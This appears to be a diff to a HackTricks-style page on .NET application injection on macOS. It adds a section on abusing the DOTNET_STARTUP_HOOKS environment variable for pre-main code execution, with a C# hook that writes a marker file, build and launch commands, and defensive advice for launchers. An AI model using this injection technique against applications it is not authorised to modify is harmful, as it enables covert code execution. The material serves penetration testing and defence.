@@ -2,7 +2,37 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**This is a summary of the post [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/). Check it for further details!**
+**This is a summary of the post [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/). Check it for further details!**<sup>[[1]](#references)</sup>
+
+## `DOTNET_STARTUP_HOOKS`
+
+.NET Core 3.0 and later support the `DOTNET_STARTUP_HOOKS` environment variable. Each path must identify a managed assembly containing a global `StartupHook` type with a `public static void Initialize()` method. The host loads the assemblies and calls their initializers synchronously before the application's `Main` entry point, giving environment control plus a readable DLL a direct pre-main code-execution primitive.<sup>[[2]](#references)</sup>
+
+```csharp
+// StartupHook.cs — compile as a class-library assembly.
+using System.IO;
+
+internal class StartupHook
+{
+    public static void Initialize()
+    {
+        File.WriteAllText("/tmp/dotnet-startup-hook-executed", "executed\n");
+    }
+}
+```
+
+```bash
+dotnet new classlib -n StartupHookPayload -f net8.0
+cp StartupHook.cs StartupHookPayload/Class1.cs
+dotnet build StartupHookPayload -c Release
+
+DOTNET_STARTUP_HOOKS="$PWD/StartupHookPayload/bin/Release/net8.0/StartupHookPayload.dll" \
+  dotnet /path/to/TargetApplication.dll
+```
+
+The hook assembly must be compatible with the application's runtime and dependencies. Relative paths containing directory separators are rejected; use an absolute path or an assembly name resolvable from the default load context. Startup hooks are disabled by default in trimmed applications, and custom native hosts may supply runtime properties directly instead of inheriting the environment.<sup>[[2]](#references)</sup>
+
+Defensive launchers should clear `DOTNET_STARTUP_HOOKS`, prevent untrusted writes to application and shared assembly paths, and test self-contained and trimmed deployments separately.
 
 ## .NET Core Debugging <a href="#net-core-debugging" id="net-core-debugging"></a>
 
@@ -115,9 +145,7 @@ The full POC code for injection into PowerShell is accessible [here](https://gis
 
 ## References
 
-- [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
+- [1] [Adam Chester (xpnsec) - macOS Injection via Third Party Frameworks](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
+- [2] [.NET runtime host startup hook design](https://github.com/dotnet/runtime/blob/main/docs/design/features/host-startup-hook.md)
 
 {{#include ../../../banners/hacktricks-training.md}}
-
-
-
